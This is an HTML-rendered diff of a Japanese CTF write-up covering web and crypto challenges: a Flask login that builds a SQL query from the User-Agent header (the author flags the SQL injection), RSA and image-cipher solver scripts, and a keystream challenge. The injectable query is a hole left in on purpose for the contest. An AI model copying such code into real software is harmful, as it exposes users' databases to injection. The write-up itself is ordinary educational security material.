+</span><span style="color:#e6db74"></span><span style="color:#e6db74">	key_func=get_remote_address,</span><span style="color:#e6db74">
+</span><span style="color:#e6db74"></span><span style="color:#e6db74">	default_limits=[</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">1 per second</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">],</span><span style="color:#e6db74">
+</span><span style="color:#e6db74"></span><span style="color:#e6db74">)</span><span style="color:#e6db74">&#34;&#34;&#34;</span>
 
 
 <span style="color:#75715e">#@limiter.exempt</span>
-<span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#34;/&#34;</span>)
+<span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">/</span><span style="color:#e6db74">&#34;</span>)
 <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">index</span>():
-	<span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#34;index.html&#34;</span>)
+	<span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">index.html</span><span style="color:#e6db74">&#34;</span>)
 
 
-<span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#34;/login&#34;</span>)
+<span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">/login</span><span style="color:#e6db74">&#34;</span>)
 <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">login</span>():
-	u <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>headers<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;User-Agent&#34;</span>)
+	u <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>headers<span style="color:#f92672">.</span>get(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">User-Agent</span><span style="color:#e6db74">&#34;</span>)
 
 	conn <span style="color:#f92672">=</span> mysql<span style="color:#f92672">.</span>connector<span style="color:#f92672">.</span>connect(
-					<span style="color:#f92672">**</span>dbconfig
+					<span style="color:#f92672">*</span><span style="color:#f92672">*</span>dbconfig
 					)
 
 	cursor <span style="color:#f92672">=</span> conn<span style="color:#f92672">.</span>cursor()
@@ -591,7 +591,7 @@ app <span style="color:#f92672">=</span> Flask(__name__)
 	<span style="color:#75715e">#cursor.execute(&#34;SET GLOVAL wait_timeout=1&#34;)	</span>
 	<span style="color:#75715e">#cursor.execute(&#34;SET GLOBAL interactive_timeout=1&#34;)</span>
 
-	<span style="color:#66d9ef">for</span> r <span style="color:#f92672">in</span> cursor<span style="color:#f92672">.</span>execute(<span style="color:#e6db74">&#34;SELECT * FROM Agents WHERE UA=&#39;</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#39;&#34;</span><span style="color:#f92672">%</span>(u), multi<span style="color:#f92672">=</span>True):
+	<span style="color:#66d9ef">for</span> r <span style="color:#f92672">in</span> cursor<span style="color:#f92672">.</span>execute(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">SELECT * FROM Agents WHERE UA=</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">%</span>(u), multi<span style="color:#f92672">=</span>True):
 		<span style="color:#66d9ef">if</span> r<span style="color:#f92672">.</span>with_rows:
 			res <span style="color:#f92672">=</span> r<span style="color:#f92672">.</span>fetchall()
 			<span style="color:#66d9ef">break</span>
@@ -602,18 +602,18 @@ app <span style="color:#f92672">=</span> Flask(__name__)
 	
 
 	<span style="color:#66d9ef">if</span> len(res) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
-		<span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#34;login.html&#34;</span>, msg<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;stop! you&#39;re not allowed in here &gt;:)&#34;</span>)
+		<span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">login.html</span><span style="color:#e6db74">&#34;</span>, msg<span style="color:#f92672">=</span><span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">stop! you</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">re not allowed in here &gt;:)</span><span style="color:#e6db74">&#34;</span>)
 
 	<span style="color:#66d9ef">if</span> len(res) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">1</span>:
-		<span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#34;login.html&#34;</span>, msg<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;hey! close, but no bananananananananana!!!! (there are many secret agents of course)&#34;</span>)
+		<span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">login.html</span><span style="color:#e6db74">&#34;</span>, msg<span style="color:#f92672">=</span><span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">hey! close, but no bananananananananana!!!! (there are many secret agents of course)</span><span style="color:#e6db74">&#34;</span>)
 
 
-	<span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#34;login.html&#34;</span>, msg<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Welcome, </span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">%</span>(res[<span style="color:#ae81ff">0</span>][<span style="color:#ae81ff">0</span>]))
+	<span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">login.html</span><span style="color:#e6db74">&#34;</span>, msg<span style="color:#f92672">=</span><span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Welcome, </span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">%</span>(res[<span style="color:#ae81ff">0</span>][<span style="color:#ae81ff">0</span>]))
 
-<span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
-	app<span style="color:#f92672">.</span>run(<span style="color:#e6db74">&#39;0.0.0.0&#39;</span>)
+<span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">__main__</span><span style="color:#e6db74">&#39;</span>:
+	app<span style="color:#f92672">.</span>run(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">0.0.0.0</span><span style="color:#e6db74">&#39;</span>)
 </code></pre></div><p>以下の部分にSQLインジェクションの脆弱性がありそうです</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">for</span> r <span style="color:#f92672">in</span> cursor<span style="color:#f92672">.</span>execute(<span style="color:#e6db74">&#34;SELECT * FROM Agents WHERE UA=&#39;</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#39;&#34;</span><span style="color:#f92672">%</span>(u), multi<span style="color:#f92672">=</span>True):
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">for</span> r <span style="color:#f92672">in</span> cursor<span style="color:#f92672">.</span>execute(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">SELECT * FROM Agents WHERE UA=</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">%</span>(u), multi<span style="color:#f92672">=</span>True):
 	<span style="color:#66d9ef">if</span> r<span style="color:#f92672">.</span>with_rows:
 		res <span style="color:#f92672">=</span> r<span style="color:#f92672">.</span>fetchall()
 		<span style="color:#66d9ef">break</span>
@@ -665,8 +665,8 @@ app <span style="color:#f92672">=</span> Flask(__name__)
         &lt;<span style="color:#f92672">title</span>&gt;Defund&#39;s Crypt&lt;/<span style="color:#f92672">title</span>&gt;
     &lt;/<span style="color:#f92672">head</span>&gt;
     &lt;<span style="color:#f92672">body</span>&gt;
-        <span style="color:#75715e">&lt;!-- Defund was a big fan of open source so head over to /src.php --&gt;</span>
-        <span style="color:#75715e">&lt;!-- Also I have a flag in the filesystem at /flag.txt but too bad you can&#39;t read it --&gt;</span>
+        <span style="color:#75715e">&lt;!--</span><span style="color:#75715e"> Defund was a big fan of open source so head over to /src.php </span><span style="color:#75715e">--&gt;</span>
+        <span style="color:#75715e">&lt;!--</span><span style="color:#75715e"> Also I have a flag in the filesystem at /flag.txt but too bad you can&#39;t read it </span><span style="color:#75715e">--&gt;</span>
         &lt;<span style="color:#f92672">h1</span>&gt;Defund&#39;s Crypt&lt;<span style="color:#f92672">span</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;small&#34;</span>&gt;o&lt;/<span style="color:#f92672">span</span>&gt;&lt;/<span style="color:#f92672">h1</span>&gt;
                 &lt;<span style="color:#f92672">img</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;crypt.jpg&#34;</span> <span style="color:#a6e22e">height</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;300&#34;</span>/&gt;
         &lt;<span style="color:#f92672">form</span> <span style="color:#a6e22e">method</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;POST&#34;</span> <span style="color:#a6e22e">action</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/&#34;</span> <span style="color:#a6e22e">autocomplete</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;off&#34;</span> <span style="color:#a6e22e">spellcheck</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;false&#34;</span> <span style="color:#a6e22e">enctype</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;multipart/form-data&#34;</span>&gt;
@@ -806,7 +806,7 @@ q <span style="color:#f92672">=</span> <span style="color:#ae81ff">1353657498006
     w <span style="color:#f92672">=</span> [<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, b]
 
     <span style="color:#66d9ef">while</span> w[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">!=</span> <span style="color:#ae81ff">1</span>:
-        q <span style="color:#f92672">=</span> r[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">//</span> w[<span style="color:#ae81ff">2</span>]
+        q <span style="color:#f92672">=</span> r[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">/</span><span style="color:#f92672">/</span> w[<span style="color:#ae81ff">2</span>]
         r2 <span style="color:#f92672">=</span> w
         w2 <span style="color:#f92672">=</span> [ r[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">-</span> q <span style="color:#f92672">*</span> w[<span style="color:#ae81ff">0</span>], r[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">-</span> q <span style="color:#f92672">*</span> w[<span style="color:#ae81ff">1</span>], r[<span style="color:#ae81ff">2</span>]<span style="color:#f92672">-</span> q <span style="color:#f92672">*</span> w[<span style="color:#ae81ff">2</span>] ]
         r <span style="color:#f92672">=</span> r2
@@ -817,7 +817,7 @@ q <span style="color:#f92672">=</span> <span style="color:#ae81ff">1353657498006
     x <span style="color:#f92672">=</span> extgcd(a, m)[<span style="color:#ae81ff">0</span>]  
     <span style="color:#66d9ef">return</span> (m <span style="color:#f92672">+</span> x <span style="color:#f92672">%</span> m ) <span style="color:#f92672">%</span> m
 
-l <span style="color:#f92672">=</span> (p <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">*</span> (q <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">//</span> math<span style="color:#f92672">.</span>gcd( (p <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>), (q <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>) )        <span style="color:#75715e"># p-1とq-1の最小公倍数lを求める</span>
+l <span style="color:#f92672">=</span> (p <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">*</span> (q <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">/</span><span style="color:#f92672">/</span> math<span style="color:#f92672">.</span>gcd( (p <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>), (q <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>) )        <span style="color:#75715e"># p-1とq-1の最小公倍数lを求める</span>
 d <span style="color:#f92672">=</span> mod_inv(e, l)                   <span style="color:#75715e"># e * d = 1 mod lより，秘密鍵dを求める</span>
 m <span style="color:#f92672">=</span> pow(c, d, n)                    <span style="color:#75715e"># c ^ d mod nより，平文mを求める</span>
 <span style="color:#66d9ef">print</span>(number<span style="color:#f92672">.</span>long_to_bytes(m))
@@ -832,7 +832,7 @@ The flag is actf{x#xx#xx_xx#xxx} where x represents any lowercase letter and # r
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> numpy <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
 <span style="color:#f92672">from</span> PIL <span style="color:#f92672">import</span> Image
 
-flag <span style="color:#f92672">=</span> Image<span style="color:#f92672">.</span>open(<span style="color:#e6db74">r</span><span style="color:#e6db74">&#34;flag.png&#34;</span>)
+flag <span style="color:#f92672">=</span> Image<span style="color:#f92672">.</span>open(<span style="color:#e6db74">r</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">flag.png</span><span style="color:#e6db74">&#34;</span>)
 img <span style="color:#f92672">=</span> array(flag)
 
 key <span style="color:#f92672">=</span> [<span style="color:#ae81ff">41</span>, <span style="color:#ae81ff">37</span>, <span style="color:#ae81ff">23</span>]
@@ -847,13 +847,13 @@ a, b, c <span style="color:#f92672">=</span> img<span style="color:#f92672">.</s
         img[x][y] <span style="color:#f92672">=</span> pixel
 
 enc <span style="color:#f92672">=</span> Image<span style="color:#f92672">.</span>fromarray(img)
-enc<span style="color:#f92672">.</span>save(<span style="color:#e6db74">&#39;enc.png&#39;</span>)
+enc<span style="color:#f92672">.</span>save(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">enc.png</span><span style="color:#e6db74">&#39;</span>)
 </code></pre></div><p>元画像のRGB値に<code>[41, 37, 23]</code>という値を掛け、251で法を取っています。</p>
 <p>RGB値は0~255までなので総当たりしてみましょう。</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> numpy <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
 <span style="color:#f92672">from</span> PIL <span style="color:#f92672">import</span> Image
 
-enc <span style="color:#f92672">=</span> Image<span style="color:#f92672">.</span>open(<span style="color:#e6db74">r</span><span style="color:#e6db74">&#34;enc.png&#34;</span>)
+enc <span style="color:#f92672">=</span> Image<span style="color:#f92672">.</span>open(<span style="color:#e6db74">r</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">enc.png</span><span style="color:#e6db74">&#34;</span>)
 img <span style="color:#f92672">=</span> array(enc)
 
 key <span style="color:#f92672">=</span> [<span style="color:#ae81ff">41</span>, <span style="color:#ae81ff">37</span>, <span style="color:#ae81ff">23</span>]
@@ -873,7 +873,7 @@ a, b, c <span style="color:#f92672">=</span> img<span style="color:#f92672">.</s
         img[x][y] <span style="color:#f92672">=</span> buf
 
 flag <span style="color:#f92672">=</span> Image<span style="color:#f92672">.</span>fromarray(img)
-flag<span style="color:#f92672">.</span>save(<span style="color:#e6db74">&#39;flag.png&#39;</span>)
+flag<span style="color:#f92672">.</span>save(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">flag.png</span><span style="color:#e6db74">&#39;</span>)
 </code></pre></div><p>少し時間がかかりますが、画像が復元できます。</p>
 <p><img src="https://user-images.githubusercontent.com/50363796/77067842-f4695000-6a28-11ea-8e48-e1be4468a1ca.png" alt="flag"></p>
 <h2 id="confused-streaming-crypto-100-pts-297-solves">Confused Streaming (Crypto, 100 pts, 297 solves)</h2>
@@ -898,44 +898,44 @@ c: 1
 	<span style="color:#66d9ef">pass</span>
 getcontext()<span style="color:#f92672">.</span>prec <span style="color:#f92672">=</span> <span style="color:#ae81ff">1000</span>
 <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">keystream</span>(key):
-	random<span style="color:#f92672">.</span>seed(int(os<span style="color:#f92672">.</span>environ[<span style="color:#e6db74">&#34;seed&#34;</span>]))
+	random<span style="color:#f92672">.</span>seed(int(os<span style="color:#f92672">.</span>environ[<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">seed</span><span style="color:#e6db74">&#34;</span>]))
 	e <span style="color:#f92672">=</span> random<span style="color:#f92672">.</span>randint(<span style="color:#ae81ff">100</span>,<span style="color:#ae81ff">1000</span>)
 	<span style="color:#66d9ef">while</span> <span style="color:#ae81ff">1</span>:
 		d <span style="color:#f92672">=</span> random<span style="color:#f92672">.</span>randint(<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">100</span>)
-		ret <span style="color:#f92672">=</span> Decimal(<span style="color:#e6db74">&#39;0.&#39;</span><span style="color:#f92672">+</span>str(key <span style="color:#f92672">**</span> e)<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;.&#39;</span>)[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>])
+		ret <span style="color:#f92672">=</span> Decimal(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">0.</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">+</span>str(key <span style="color:#f92672">*</span><span style="color:#f92672">*</span> e)<span style="color:#f92672">.</span>split(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">.</span><span style="color:#e6db74">&#39;</span>)[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>])
 		<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(d):
-			ret<span style="color:#f92672">*=</span><span style="color:#ae81ff">2</span>
-		<span style="color:#66d9ef">yield</span> int((ret<span style="color:#f92672">//</span><span style="color:#ae81ff">1</span>)<span style="color:#f92672">%</span><span style="color:#ae81ff">2</span>)
-		e<span style="color:#f92672">+=</span><span style="color:#ae81ff">1</span>
+			ret<span style="color:#f92672">*</span><span style="color:#f92672">=</span><span style="color:#ae81ff">2</span>
+		<span style="color:#66d9ef">yield</span> int((ret<span style="color:#f92672">/</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1</span>)<span style="color:#f92672">%</span><span style="color:#ae81ff">2</span>)
+		e<span style="color:#f92672">+</span><span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>
 <span style="color:#66d9ef">try</span>:
-	a <span style="color:#f92672">=</span> int(input(<span style="color:#e6db74">&#34;a: &#34;</span>))
-	b <span style="color:#f92672">=</span> int(input(<span style="color:#e6db74">&#34;b: &#34;</span>))
-	c <span style="color:#f92672">=</span> int(input(<span style="color:#e6db74">&#34;c: &#34;</span>))
+	a <span style="color:#f92672">=</span> int(input(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">a: </span><span style="color:#e6db74">&#34;</span>))
+	b <span style="color:#f92672">=</span> int(input(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">b: </span><span style="color:#e6db74">&#34;</span>))
+	c <span style="color:#f92672">=</span> int(input(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">c: </span><span style="color:#e6db74">&#34;</span>))
 	<span style="color:#75715e"># remove those pesky imaginary numbers, rationals, zeroes, integers, big numbers, etc</span>
-	<span style="color:#66d9ef">if</span> b<span style="color:#f92672">*</span>b <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">4</span><span style="color:#f92672">*</span>a<span style="color:#f92672">*</span>c <span style="color:#f92672">or</span> a<span style="color:#f92672">==</span><span style="color:#ae81ff">0</span> <span style="color:#f92672">or</span> b<span style="color:#f92672">==</span><span style="color:#ae81ff">0</span> <span style="color:#f92672">or</span> c<span style="color:#f92672">==</span><span style="color:#ae81ff">0</span> <span style="color:#f92672">or</span> Decimal(b<span style="color:#f92672">*</span>b<span style="color:#f92672">-</span><span style="color:#ae81ff">4</span><span style="color:#f92672">*</span>a<span style="color:#f92672">*</span>c)<span style="color:#f92672">.</span>sqrt()<span style="color:#f92672">.</span>to_integral_value()<span style="color:#f92672">**</span><span style="color:#ae81ff">2</span><span style="color:#f92672">==</span>b<span style="color:#f92672">*</span>b<span style="color:#f92672">-</span><span style="color:#ae81ff">4</span><span style="color:#f92672">*</span>a<span style="color:#f92672">*</span>c <span style="color:#f92672">or</span> abs(a)<span style="color:#f92672">&gt;</span><span style="color:#ae81ff">1000</span> <span style="color:#f92672">or</span> abs(b)<span style="color:#f92672">&gt;</span><span style="color:#ae81ff">1000</span> <span style="color:#f92672">or</span> abs(c)<span style="color:#f92672">&gt;</span><span style="color:#ae81ff">1000</span>:
+	<span style="color:#66d9ef">if</span> b<span style="color:#f92672">*</span>b <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">4</span><span style="color:#f92672">*</span>a<span style="color:#f92672">*</span>c <span style="color:#f92672">or</span> a<span style="color:#f92672">==</span><span style="color:#ae81ff">0</span> <span style="color:#f92672">or</span> b<span style="color:#f92672">==</span><span style="color:#ae81ff">0</span> <span style="color:#f92672">or</span> c<span style="color:#f92672">==</span><span style="color:#ae81ff">0</span> <span style="color:#f92672">or</span> Decimal(b<span style="color:#f92672">*</span>b<span style="color:#f92672">-</span><span style="color:#ae81ff">4</span><span style="color:#f92672">*</span>a<span style="color:#f92672">*</span>c)<span style="color:#f92672">.</span>sqrt()<span style="color:#f92672">.</span>to_integral_value()<span style="color:#f92672">*</span><span style="color:#f92672">*</span><span style="color:#ae81ff">2</span><span style="color:#f92672">==</span>b<span style="color:#f92672">*</span>b<span style="color:#f92672">-</span><span style="color:#ae81ff">4</span><span style="color:#f92672">*</span>a<span style="color:#f92672">*</span>c <span style="color:#f92672">or</span> abs(a)<span style="color:#f92672">&gt;</span><span style="color:#ae81ff">1000</span> <span style="color:#f92672">or</span> abs(b)<span style="color:#f92672">&gt;</span><span style="color:#ae81ff">1000</span> <span style="color:#f92672">or</span> abs(c)<span style="color:#f92672">&gt;</span><span style="color:#ae81ff">1000</span>:
 		<span style="color:#66d9ef">raise</span> <span style="color:#a6e22e">Exception</span>()
 	key <span style="color:#f92672">=</span> (Decimal(b<span style="color:#f92672">*</span>b<span style="color:#f92672">-</span><span style="color:#ae81ff">4</span><span style="color:#f92672">*</span>a<span style="color:#f92672">*</span>c)<span style="color:#f92672">.</span>sqrt() <span style="color:#f92672">-</span> Decimal(b))<span style="color:#f92672">/</span>Decimal(a<span style="color:#f92672">*</span><span style="color:#ae81ff">2</span>)
 <span style="color:#66d9ef">except</span>:
-	<span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;bad key&#34;</span>)
+	<span style="color:#66d9ef">print</span>(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">bad key</span><span style="color:#e6db74">&#34;</span>)
 <span style="color:#66d9ef">else</span>:
-	flag <span style="color:#f92672">=</span> binascii<span style="color:#f92672">.</span>hexlify(os<span style="color:#f92672">.</span>environ[<span style="color:#e6db74">&#34;flag&#34;</span>]<span style="color:#f92672">.</span>encode())
+	flag <span style="color:#f92672">=</span> binascii<span style="color:#f92672">.</span>hexlify(os<span style="color:#f92672">.</span>environ[<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">flag</span><span style="color:#e6db74">&#34;</span>]<span style="color:#f92672">.</span>encode())
 	flag <span style="color:#f92672">=</span> bin(int(flag,<span style="color:#ae81ff">16</span>))[<span style="color:#ae81ff">2</span>:]<span style="color:#f92672">.</span>zfill(len(flag)<span style="color:#f92672">*</span><span style="color:#ae81ff">4</span>)
-	ret <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+	ret <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">&#34;</span>
 	k <span style="color:#f92672">=</span> keystream(key)
 	<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> flag:
-		ret <span style="color:#f92672">+=</span> str(next(k)<span style="color:#f92672">^</span>int(i))
+		ret <span style="color:#f92672">+</span><span style="color:#f92672">=</span> str(next(k)<span style="color:#f92672">^</span>int(i))
 	<span style="color:#66d9ef">print</span>(ret)
 </code></pre></div><p>少々複雑だったので、手元に環境を構築し動作を確認したところ、
 <code>a=1, b=4, c=1</code>の時にフラグが暗号化されないことが分かりました。</p>
 <p>(<code>flag = bin(int(flag,16))[2:].zfill(len(flag)*4)</code>と<code>ret</code>が同じ値になる)</p>
 <p>なので、鍵などを使わない単純なエンコードを元に戻せば良さそうです。</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">flag <span style="color:#f92672">=</span> binascii<span style="color:#f92672">.</span>hexlify(os<span style="color:#f92672">.</span>environ[<span style="color:#e6db74">&#34;flag&#34;</span>]<span style="color:#f92672">.</span>encode())
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">flag <span style="color:#f92672">=</span> binascii<span style="color:#f92672">.</span>hexlify(os<span style="color:#f92672">.</span>environ[<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">flag</span><span style="color:#e6db74">&#34;</span>]<span style="color:#f92672">.</span>encode())
 flag <span style="color:#f92672">=</span> bin(int(flag,<span style="color:#ae81ff">16</span>))[<span style="color:#ae81ff">2</span>:]<span style="color:#f92672">.</span>zfill(len(flag)<span style="color:#f92672">*</span><span style="color:#ae81ff">4</span>)
 </code></pre></div><p>元に戻すプログラムは以下の通りです。</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> random<span style="color:#f92672">,</span>os<span style="color:#f92672">,</span>sys<span style="color:#f92672">,</span>binascii
 <span style="color:#f92672">from</span> decimal <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
 
-enc_flag <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;01100001011000110111010001100110011110110110010001101111011101110110111001011111011101000110111101011111011101000110100001100101010111110110010001100101011000110110100101101101011000010110110001111101&#39;</span>
+enc_flag <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">01100001011000110111010001100110011110110110010001101111011101110110111001011111011101000110111101011111011101000110100001100101010111110110010001100101011000110110100101101101011000010110110001111101</span><span style="color:#e6db74">&#39;</span>
 
 dec_flag <span style="color:#f92672">=</span> binascii<span style="color:#f92672">.</span>unhexlify(hex(int(enc_flag,<span style="color:#ae81ff">2</span>))[<span style="color:#ae81ff">2</span>:])
 <span style="color:#66d9ef">print</span>(dec_flag)
@@ -970,15 +970,15 @@ Wrong! The correct answer was w with key r
 <span style="color:#f92672">import</span> os
 
 <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">otp</span>(a, b):
-	r <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+	r <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">&#34;</span>
 	<span style="color:#66d9ef">for</span> i, j <span style="color:#f92672">in</span> zip(a, b):
-		r <span style="color:#f92672">+=</span> chr(ord(i) <span style="color:#f92672">^</span> ord(j))
+		r <span style="color:#f92672">+</span><span style="color:#f92672">=</span> chr(ord(i) <span style="color:#f92672">^</span> ord(j))
 	<span style="color:#66d9ef">return</span> r
 
 
 <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">genSample</span>():
-	p <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join([string<span style="color:#f92672">.</span>ascii_letters[random<span style="color:#f92672">.</span>randint(<span style="color:#ae81ff">0</span>, len(string<span style="color:#f92672">.</span>ascii_letters)<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>)] <span style="color:#66d9ef">for</span> _ <span style="color:#f92672">in</span> range(random<span style="color:#f92672">.</span>randint(<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">30</span>))])
-	k <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join([string<span style="color:#f92672">.</span>ascii_letters[random<span style="color:#f92672">.</span>randint(<span style="color:#ae81ff">0</span>, len(string<span style="color:#f92672">.</span>ascii_letters)<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>)] <span style="color:#66d9ef">for</span> _ <span style="color:#f92672">in</span> range(len(p))])
